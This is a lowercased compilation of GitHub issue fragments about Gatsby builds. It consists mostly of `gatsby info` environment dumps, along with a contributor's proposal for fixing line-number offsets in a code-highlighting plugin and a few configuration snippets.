system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.12.0 - /usr/local/bin/node npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.163 safari: 13.1 npmpackages: gatsby: ^2.20.15 => 2.20.15 gatsby-cli: ^2.11.5 => 2.11.5 gatsby-image: ^2.3.2 => 2.3.2 gatsby-plugin-emotion: ^4.2.1 => 4.2.1 gatsby-plugin-offline: ^3.1.2 => 3.1.2 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-sass: ^2.2.1 => 2.2.1 gatsby-plugin-sharp: ^2.5.4 => 2.5.4 gatsby-plugin-smoothscroll: ^1.1.0 => 1.1.0 gatsby-plugin-typography: ^2.4.1 => 2.4.1 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-source-graphql: ^2.3.2 => 2.3.2 gatsby-transformer-sharp: ^2.4.4 => 2.4.4 npmglobalpackages: gatsby-cli: 2.11.6
* info: ``` $ npx gatsby info system: os: linux 5.5 fedora 30 (workstation edition) 30 (workstation edition) cpu: (8) x64 intel(r) core(tm) i7-8665u cpu @ 1.90ghz shell: 5.0.11 - /bin/bash binaries: node: 10.19.0 - /usr/bin/node npm: 6.13.4 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: firefox: 74.0.1 npmpackages: gatsby: ^2.20.16 => 2.20.16 ``` * kernel: ``` $ uname -r 5.5.10-100.fc30.x86_64 ``` * system tmp directory: ``` $ mount | grep /tmp tmpfs on /tmp type tmpfs (rw,nosuid,nodev) ``` * system partition (with `home` directory): ``` $ mount | grep " / " /dev/mapper/space-system on / type ext4 (rw,relatime) ``` * gatsby version: ``` $ npx gatsby --version gatsby cli version: 2.11.6 gatsby version: 2.20.16 ```
$ yarn run gatsby info --clipboard
yarn run v1.21.1
$ c:\\users\\alexa\\apf2\ ode_modules\\.bin\\gatsby info --clipboard system: os: windows 10 10.0.18363 cpu: (16) x64 intel(r) core(tm) i9-9900k cpu @ 3.60ghz binaries: node: 13.7.0 - c:\\users\\alexa\\appdata\\local\\temp\\yarn--1586513843303-0.6222992253623871\ ode.cmd yarn: 1.21.1 - c:\\users\\alexa\\appdata\\local\\temp\\yarn--1586513843303-0.6222992253623871\\yarn.cmd npm: 6.13.6 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 browsers: edge: 44.18362.449.0 npmpackages: gatsby: 2.20.14 => 2.20.14 gatsby-image: 2.3.2 => 2.3.2 gatsby-plugin-create-client-paths: 2.2.1 => 2.2.1 gatsby-plugin-eslint: 2.0.8 => 2.0.8 gatsby-plugin-manifest: 2.3.3 => 2.3.3 gatsby-plugin-offline: 3.1.2 => 3.1.2 gatsby-plugin-react-helmet: 3.2.1 => 3.2.1 gatsby-plugin-sharp: 2.5.4 => 2.5.4 gatsby-plugin-styled-components: 3.2.1 => 3.2.1 gatsby-plugin-typography: 2.4.1 => 2.4.1 gatsby-plugin-web-font-loader: 1.0.4 => 1.0.4 gatsby-remark-autolink-headers: 2.2.1 => 2.2.1 gatsby-remark-copy-linked-files: 2.2.1 => 2.2.1 gatsby-remark-embed-video: 2.0.1 => 2.0.1 gatsby-remark-emojis: 0.4.2 => 0.4.2 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-images: 3.2.2 => 3.2.2 gatsby-remark-images-medium-zoom: 1.5.0 => 1.5.0 gatsby-source-filesystem: 2.2.2 => 2.2.2 gatsby-transformer-remark: 2.7.1 => 2.7.1 gatsby-transformer-sharp: 2.4.4 => 2.4.4
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.6.0 - ~/.nave/installed/12.6.0/bin/node npm: 6.9.0 - ~/.nave/installed/12.6.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.163 safari: 13.1 npmpackages: gatsby: ^2.20.12 => 2.20.12
system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.10.1 - /usr/local/bin/node npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.163 firefox: 70.0.1 safari: 13.1 npmpackages: gatsby: ^2.20.12 => 2.20.12 gatsby-image: ^2.3.1 => 2.3.1 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-offline: ^3.1.2 => 3.1.2 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-source-graphql: ^2.1.25 => 2.3.2 gatsby-transformer-sharp: ^2.4.3 => 2.4.3 npmglobalpackages: gatsby-cli: 2.11.5
system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i5-7267u cpu @ 3.10ghz shell: 3.2.57 - /bin/bash binaries: node: 13.10.1 - /usr/local/bin/node npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.163 firefox: 66.0.4 safari: 13.0.5 npmglobalpackages: gatsby-cli: 2.11.5 # proposed solution
i've developed a naive solution [in this branch](
this involves adding an additional action to the directives handler ([`directives.js`]( that keeps track of lines removed during processing
the count of `linesremoved` is then passed back through [`highlight-code.js`]( and then once again to [`index.js`](
this value can then be fed into the line number generator to compensate for the lines removed during directive processing
essentially this solution tries to allow feedback from the code-highlighter to be provided to the line number generator as currently, they run independently from one another
on the one hand, the independent modularity is good, but with the addition of comment directives outside of prismjs there needs to be some connection between components so that the additional features are being recognised at each part of the plugin
the alternative solution i initially considered involved performing an additional round of directive handling independently within `add-line-numbers.js` but ultimately the solution described above sounded more robust and required less unneccesary duplication
due to the fact that i'm changing the main return of `directives.js` and `highlight-code.js` to an object composed of both the highlighted code and total lines removed, **this will cause the currently implemented tests to fail, [here]( and [here](
ideally, i'd love to hear a better solution for passing `linesremoved` to [`add-line-numbers.js`]( also i'd like to know if this will have any unintended side-effects that i haven't seen
if any maintainers have suggestions or comments on how to move forward with this issue or how to modify/create the solution feel free
thanks for taking the time to check this out.
``` system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.0.0 - ~/.nvm/versions/node/v12.0.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v12.0.0/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 80.0.3987.163 firefox: 74.0 safari: 13.1 npmpackages: gatsby: ^2.20.14 => 2.20.14 gatsby-plugin-google-marketing-platform: ^0.1.20 => 0.1.20 gatsby-plugin-netlify-cms: ^4.2.2 => 4.2.2 gatsby-plugin-postcss: ^2.2.1 => 2.2.1 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-resolve-src: ^2.0.0 => 2.0.0 gatsby-plugin-sass: ^2.2.1 => 2.2.1 gatsby-plugin-webmention: ^0.2.0 => 0.2.0 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-transformer-remark: ^2.7.1 => 2.7.1
system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 5.3 - /bin/zsh binaries: node: 12.16.1 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 80.0.3987.163 firefox: 69.0.1 safari: 12.1.1 npmpackages: gatsby: ^2.19.43 => 2.19.45 gatsby-cli: ^2.11.5 => 2.11.5 gatsby-plugin-offline: ^3.0.40 => 3.0.41 gatsby-plugin-react-helmet: ^3.1.23 => 3.1.24 gatsby-source-strapi: 0.0.11 => 0.0.11
gatsby-config.js
module.exports = { /* your site config here */ sitemetadata: { title: `city of manila` }, plugins: [ `gatsby-plugin-emotion`, `gatsby-transformer-remark`, `gatsby-plugin-react-helmet`, { resolve: 'gatsby-plugin-web-font-loader', options: { google: { families: ['quicksand'] } } }, { resolve: `gatsby-plugin-manifest`, options: { name: `city of manila`, short_name: `city of manila`, start_url: `/`, background_color: `#6b37bf`, theme_color: `#6b37bf`, display: `standalone`, icon: `src/images/icon.png` // this path is relative to the root of the site
} }, { resolve: `gatsby-source-filesystem`, options: { name: `src`, path: `${__dirname}/src/` } } ]
``` system: os: macos mojave 10.14.3 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.3 - /usr/local/bin/node npm: 6.4.1 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 80.0.3987.163 safari: 12.0.3 npmpackages: gatsby: ^2.19.45 => 2.20.12 gatsby-plugin-emotion: ^4.2.1 => 4.2.1 gatsby-plugin-manifest: ^2.3.3 => 2.3.
3 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-transformer-remark: ^2.7.1 => 2.7.1 npmglobalpackages: gatsby-cli: 2.11.4
``` system: os: windows 10 10.0.17763 cpu: (8) x64 intel(r) core(tm) i7-4770k cpu @ 3.50ghz binaries: node: 12.16.1 - c:\\program files\ odejs\ ode.exe yarn: 1.9.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 - /c/python27/python browsers: edge: 44.17763.831.0 npmpackages: gatsby: ^2.19.45 => 2.19.45 gatsby-image: ^2.2.44 => 2.2.44 gatsby-plugin-google-analytics: ^2.1.38 => 2.1.38 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.2.48 => 2.2.48 gatsby-plugin-offline: ^3.0.42 => 3.0.42 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.24 => 3.1.24 gatsby-plugin-sharp: ^2.4.13 => 2.4.13 gatsby-plugin-sitemap: ^2.2.30 => 2.2.30 gatsby-plugin-styled-components: ^3.2.1 => 3.2.1 gatsby-source-filesystem: ^2.1.56 => 2.1.56 gatsby-styled-components-dark-mode: ^1.1.1 => 1.1.1 gatsby-transformer-sharp: ^2.3.19 => 2.3.19
``` also if it helps here's the full log output from my console (it's really long though):
[localhost-1586319860749.log](
before `npm update` system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 12.10.0 - /usr/local/bin/node yarn: 1.19.0 - /usr/local/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.16 - /users/kyemaloy/.pyenv/shims/python browsers: chrome: 80.0.3987.149 firefox: 74.0.1 safari: 13.1 npmpackages: gatsby: ^2.9.6 => 2.9.6 gatsby-plugin-client-side-redirect: 0.0.2 => 0.0.2 gatsby-plugin-google-analytics: ^2.1.0 => 2.1.0 gatsby-plugin-manifest: ^2.2.41 => 2.2.41 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-remove-trailing-slashes: ^2.1.15 => 2.1.15 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.4.5 => 2.4.5 gatsby-remark-autolink-headers: ^2.1.10 => 2.1.10 gatsby-remark-embed-youtube: 0.0.7 => 0.0.7 gatsby-remark-images: ^3.1.28 => 3.1.28 gatsby-source-filesystem: ^2.1.0 => 2.1.0 gatsby-transformer-remark: ^2.5.0 => 2.5.0 gatsby-transformer-yaml: ^2.2.4 => 2.2.4 npmglobalpackages: gatsby-cli: 2.8.29 after `npm update` system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 12.10.0 - /usr/local/bin/node yarn: 1.19.0 - /usr/local/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.16 - /users/kyemaloy/.pyenv/shims/python browsers: chrome: 80.0.3987.149 firefox: 74.0.1 safari: 13.1 npmpackages: gatsby: ^2.9.6 => 2.20.10 gatsby-plugin-client-side-redirect: 0.0.2 => 0.0.2 gatsby-plugin-google-analytics: ^2.1.0 => 2.2.2 gatsby-plugin-manifest: ^2.2.41 => 2.3.3 gatsby-plugin-react-helmet: ^3.0.12 => 3.2.1 gatsby-plugin-remove-trailing-slashes: ^2.1.15 => 2.2.1 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.4.5 => 2.5.3 gatsby-remark-autolink-headers: ^2.1.10 => 2.2.1 gatsby-remark-embed-youtube: 0.0.7 => 0.0.7 gatsby-remark-images: ^3.1.28 => 3.2.1 gatsby-source-filesystem: ^2.1.0 => 2.2.2 gatsby-transformer-remark: ^2.5.0 => 2.7.1 gatsby-transformer-yaml: ^2.2.4 => 2.3.1 npmglobalpackages: gatsby-cli: 2.8.29
gatsby-remark-copy-linked-files@2.0.9 is ok, but 2.2.1 is broken
2.0.9 replace the link with a hash suffix, which can avoid the problem
system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i5-4570s cpu @ 2.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.0 - /usr/local/bin/node npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.163 safari: 13.1 npmpackages: gatsby: ^2.20.7 => 2.20.7 gatsby-cli: ^2.6.4 => 2.8.30 gatsby-image: ^2.2.33 => 2.2.41 gatsby-link: ^2.2.24 => 2.2.29 gatsby-plugin-create-client-paths: ^2.1.17 => 2.1.22 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-material-ui: ^2.1.6 => 2.1.6 gatsby-plugin-offline: ^3.0.22 => 3.0.35 gatsby-plugin-react-helmet: ^3.1.15 => 3.1.22 gatsby-plugin-sass: ^2.1.23 => 2.1.28 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-source-filesystem: ^2.1.38 => 2.1.48 gatsby-source-graphql: ^2.1.24 => 2.1.33 gatsby-transformer-sharp: ^2.4.2 => 2.4.2 npmglobalpackages: gatsby-cli: 2.8.29
``` system: os: linux 5.5 endeavouros cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 5.0.16 - /bin/bash binaries: node: 13.9.0 - ~/.nvm/versions/node/v13.9.0/bin/node yarn: 1.22.0 - ~/.nvm/versions/node/v13.9.0/bin/yarn npm: 6.13.7 - ~/.nvm/versions/node/v13.9.0/bin/npm languages: python: 3.8.2 - /usr/bin/python npmpackages: gatsby: ^2.20.12 => 2.20.12 gatsby-image: ^2.3.1 => 2.3.1 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-offline: ^3.1.2 => 3.1.2 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-typescript: ^2.3.1 => 2.3.1 npmglobalpackages: gatsby-cli: 2.11.3
``` system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i7-6700k cpu @ 4.00ghz binaries: node: 10.18.0 - c:\\program files\ odejs\ ode.exe yarn: 1.16.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.13.7 - c:\\program files\ odejs\ pm.cmd languages: python: 3.5.1 - c:\\program files\\python35\\python.exe browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.20.12 => 2.20.12 gatsby-image: ^2.3.1 => 2.3.1 gatsby-mdx-tts: 0.0.6 => 0.0.6 gatsby-plugin-emotion: ^4.1.23 => 4.1.23 gatsby-plugin-manifest: ^2.3.2 => 2.3.2 gatsby-plugin-mdx: ^1.0.75 => 1.0.75 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-polyfill-io: ^1.1.0 => 1.1.0 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.5.4 => 2.5.4 gatsby-plugin-sitemap: ^2.2.27 => 2.2.27 gatsby-plugin-ts-config: ^0.2.1 => 0.2.1 gatsby-plugin-typescript: ^2.2.0 => 2.2.0 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-polly: 0.0.1 => 0.0.1 gatsby-transformer-sharp: ^2.4.4 => 2.4.4 ```
system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - /usr/local/bin/node yarn: 1.22.0 - ~/.yarn/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 safari: 13.0.5 npmpackages: gatsby: ^2.19.7 => 2.20.12 gatsby-background-image: ^0.10.2 => 0.10.2 gatsby-cli: ^2.10.0 => 2.11.5 gatsby-image: ^2.2.39 => 2.3.1 gatsby-plugin-layout: ^1.1.22 => 1.2.1 gatsby-plugin-manifest: ^2.2.39 => 2.3.3 gatsby-plugin-offline: ^3.0.32 => 3.1.2 gatsby-plugin-postcss: ^2.1.21 => 2.2.1 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.21 => 3.2.1 gatsby-plugin-sharp: ^2.4.3 => 2.5.4 gatsby-plugin-styled-components: ^3.1.19 => 3.2.1 gatsby-plugin-transitions: ^2.1.6 => 2.1.6 gatsby-source-filesystem: ^2.1.46 => 2.2.2 gatsby-transformer-sharp: ^2.3.13 => 2.4.4 npmglobalpackages: gatsby-cli: 2.10.0 gatsby: 2.19.27
``` system: os: linux 4.19 arch linux cpu: (8) x64 intel(r) core(tm) i7-8650u cpu @ 1.90ghz shell: 5.7.1 - /usr/bin/zsh binaries: node: 13.12.0 - ~/.nvm/versions/node/v13.12.0/bin/node npm: 6.14.4 - ~/.nvm/versions/node/v13.12.0/bin/npm languages: python: 3.8.0 - /home/varun/.pyenv/shims/python browsers: firefox: 72.0.2 npmpackages: gatsby: ^2.19.45 => 2.19.45 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 npmglobalpackages: gatsby-cli: 2.11.4
system: os: macos 10.15.4 cpu: (6) x64 intel(r) core(tm) i5-8600 cpu @ 3.10ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.6.0 - /usr/local/bin/node npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 safari: 13.1 npmpackages: gatsby: ^2.20.10 => 2.20.10 gatsby-concurrent-mode: ^1.0.0 => 1.0.0 gatsby-image: ^2.2.30 => 2.3.1 gatsby-plugin-analytics: ^0.2.0 => 0.2.0 gatsby-plugin-catch-links: ^2.1.19 => 2.2.1 gatsby-plugin-config: ^1.0.7 => 1.0.7 gatsby-plugin-emotion: ^4.1.13 => 4.2.1 gatsby-plugin-gtag: ^1.0.13 => 1.0.13 gatsby-plugin-htaccess: ^1.4.0 => 1.4.0 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-material-ui: ^2.1.6 => 2.1.6 gatsby-plugin-offline: ^3.1.2 => 3.1.2 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-preload-fonts: ^1.0.27 => 1.1.1 gatsby-plugin-react-helmet: ^3.1.16 => 3.2.1 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-sass: ^2.1.24 => 2.2.1 gatsby-plugin-sharp: ^2.2.36 => 2.5.3 gatsby-plugin-sitemap: ^2.2.22 => 2.3.1 gatsby-plugin-styled-components: ^3.1.14 => 3.2.1 gatsby-source-filesystem: ^2.1.35 => 2.2.2 gatsby-source-graphql: ^2.3.0 => 2.3.0 gatsby-source-wordpress: ^3.2.3 => 3.2.3 gatsby-transformer-pdf: ^1.1.17 => 1.2.1 gatsby-transformer-remote-filesystem: ^1.0.0 => 1.0.0 gatsby-transformer-sharp: ^2.4.3 => 2.4.3 gatsby-transformer-sqip: ^2.1.40 => 2.2.3 gatsby-wpgraphql-inline-images: ^0.1.6 => 0.1.6 npmglobalpackages: gatsby-cli: 2.8.27
system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.0 - /usr/local/opt/node@12/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.13.4 - /usr/local/opt/node@12/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 safari: 13.1 npmpackages: gatsby: ^2.19.45 => 2.20.12 gatsby-plugin-sass: ^2.2.1 => 2.2.1 npmglobalpackages: gatsby-cli: 2.11.4
system: os: windows 10 10.0.18362 cpu: (4) x64 intel(r) core(tm) i5-2500k cpu @ 3.30ghz binaries: node: 12.10.0 - c:\\program files\ odejs\ ode.exe npm: 6.10.3 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.19.45 => 2.19.45 gatsby-plugin-emotion: ^4.2.1 => 4.2.1 gatsby-plugin-typography: ^2.4.1 => 2.4.1 gatsby-source-filesystem: ^2.2.2 => 2.2.2
system: os: macos 10.15.2 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.13.0 - ~/.nvm/versions/node/v10.13.0/bin/node yarn: 1.19.2 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.13.0/bin/npm languages: python: 3.7.6 - /usr/local/opt/python/libexec/bin/python browsers: chrome: 80.0.3987.163 safari: 13.0.4 npmpackages: gatsby: ^2.20.12 => 2.20.12 gatsby-image: ^2.0.13 => 2.0.33 gatsby-plugin-canonical-urls: ^2.1.5 => 2.1.5 gatsby-plugin-catch-links: ^2.1.5 => 2.1.17 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-google-gtag: ^1.0.17 => 1.0.17 gatsby-plugin-hotjar: ^1.0.1 => 1.0.1 gatsby-plugin-netlify-cache: ^1.0.0 => 1.0.0 gatsby-plugin-polyfill-io: ^1.1.0 => 1.1.0 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-robots-txt: ^1.3.0 => 1.3.0 gatsby-plugin-sass: ^2.0.1 => 2.0.7 gatsby-plugin-sharp: ^2.4.5 => 2.4.5 gatsby-plugin-sitemap: ^2.0.5 => 2.0.5 gatsby-plugin-typescript: ^2.0.15 => 2.0.15 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-source-contentful: ^2.2.5 => 2.2.5 gatsby-source-filesystem: ^2.0.2 => 2.0.5 gatsby-source-stripe: ^3.0.4 => 3.0.4 gatsby-transformer-sharp: ^2.3.14 => 2.3.14 npmglobalpackages: gatsby-cli: 2.11.5 i've also updated node to 12.16.1 -- and still fails
``` system: os: macos 10.15.3 cpu: (16) x64 intel(r) core(tm) i9-9900k cpu @ 3.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.0 - ~/.nvm/versions/node/v10.16.0/bin/node yarn: 1.19.2 - /usr/local/bin/yarn npm: 6.11.3 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 firefox: 74.0 safari: 13.0.5 npmpackages: gatsby: ^2.13.41 => 2.20.12 gatsby-image: ^2.1.2 => 2.3.1 gatsby-plugin-canonical-urls: ^2.0.13 => 2.2.1 gatsby-plugin-emotion: ^4.0.7 => 4.2.1 gatsby-plugin-google-tagmanager: ^2.0.15 => 2.2.1 gatsby-plugin-manifest: ^2.2.5 => 2.3.3 gatsby-plugin-netlify: ^2.1.31 => 2.2.1 gatsby-plugin-offline: ^3.0.6 => 3.1.2 gatsby-plugin-react-helmet: ^3.0.12 => 3.2.1 gatsby-plugin-react-svg: ^2.1.1 => 2.1.2 gatsby-plugin-robots-txt: ^1.4.0 => 1.5.0 gatsby-plugin-sharp: ^2.1.3 => 2.5.3 gatsby-plugin-sitemap: ^2.1.0 => 2.3.1 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.0.37 => 2.2.2 gatsby-source-graphql: ^2.3.1 => 2.3.1 gatsby-source-instagram: ^0.5.0 => 0.5.1 gatsby-source-twitter: ^3.0.0 => 3.2.1 gatsby-transformer-csv: ^2.2.1 => 2.2.1 gatsby-transformer-sharp: ^2.1.21 => 2.4.3 ```
system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.10.1 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.3 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 safari: 13.0.5 npmpackages: gatsby: ^2.19.7 => 2.19.41 gatsby-background-image: ^0.10.2 => 0.10.2 gatsby-cli: ^2.10.9 => 2.11.1 gatsby-image: ^2.2.39 => 2.2.43 gatsby-plugin-env-variables: ^1.0.1 => 1.0.1 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.2.39 => 2.2.47 gatsby-plugin-offline: ^3.0.32 => 3.0.40 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.23 gatsby-plugin-sass: ^2.1.30 => 2.1.30 gatsby-plugin-sharp: ^2.4.3 => 2.4.12 gatsby-plugin-sitemap: ^2.3.1 => 2.3.1 gatsby-source-filesystem: ^2.1.46 => 2.1.54 gatsby-transformer-sharp: ^2.3.13 => 2.3.18 npmglobalpackages: gatsby-cli: 2.10.9
system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 12.14.1 - ~/.nvm/versions/node/v12.14.1/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.14.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 safari: 13.0.5 npmpackages: gatsby: ^2.20.10 => 2.20.10 gatsby-link: ^2.2.27 => 2.3.1 gatsby-plugin-algolia: ^0.5.0 => 0.5.0 gatsby-plugin-gtag: ^1.0.12 => 1.0.13 gatsby-plugin-layout: ^1.1.18 => 1.2.1 gatsby-plugin-mdx: ^1.0.61 => 1.1.4 gatsby-plugin-no-sourcemaps: ^2.1.2 => 2.2.0 gatsby-plugin-offline: ^3.0.29 => 3.1.2 gatsby-plugin-postcss: ^2.1.20 => 2.2.1 gatsby-plugin-react-helmet: ^3.1.18 => 3.2.1 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-remove-trailing-slashes: ^2.1.17 => 2.2.1 gatsby-plugin-sitemap: ^2.2.24 => 2.3.1 gatsby-remark-attr: 0.0.3 => 0.0.3 gatsby-remark-copy-linked-files: ^2.1.33 => 2.2.1 gatsby-source-filesystem: ^2.1.42 => 2.2.2 gatsby-transformer-remark: ^2.6.42 => 2.7.1
i only see this on live preview, and not on my local.
system: os: linux 4.19 debian gnu/linux 10 (buster) 10 (buster) cpu: (12) x64 intel(r) core(tm) i7-8700 cpu @ 3.20ghz shell: 5.0.3 - /bin/bash binaries: node: 10.18.1 - /tmp/yarn--1585757330032-0.1053501887919337/node yarn: 1.21.1 - /tmp/yarn--1585757330032-0.1053501887919337/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python npmpackages: gatsby: 2.20.9 => 2.20.9 gatsby-plugin-mdx: ^1.0.23 => 1.0.23
``` cc @christopherbiscardi
```sh system: os: linux 4.15 ubuntu 18.04.2 lts (bionic beaver) cpu: (1) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 4.4.19 - /bin/bash binaries: node: 12.0.0 - ~/.nvm/versions/node/v12.0.0/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v12.0.0/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.0.0/bin/npm languages: python: 2.7.15+ - /usr/bin/python npmpackages: gatsby: ^2.7.5 => 2.13.8 gatsby-image: ^2.3.1 => 2.3.1 gatsby-plugin-graphql-codegen: ^2.6.1 => 2.6.1 gatsby-plugin-react-helmet: ^3.1.2 => 3.1.2 gatsby-plugin-sass: ^2.1.3 => 2.1.3 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-plugin-typescript: ^2.3.1 => 2.3.1 gatsby-source-filesystem: ^2.1.5 => 2.1.5 gatsby-transformer-remark: ^2.6.7 => 2.6.7 gatsby-transformer-sharp: ^2.4.3 => 2.4.3 npmglobalpackages: gatsby-cli: 2.11.3
``` gatsby.config.js ```js module.exports = { /* your site config here */ sitemetadata: { title: `environment awareness tracker (eat)`, description: "lorem ipsum ..
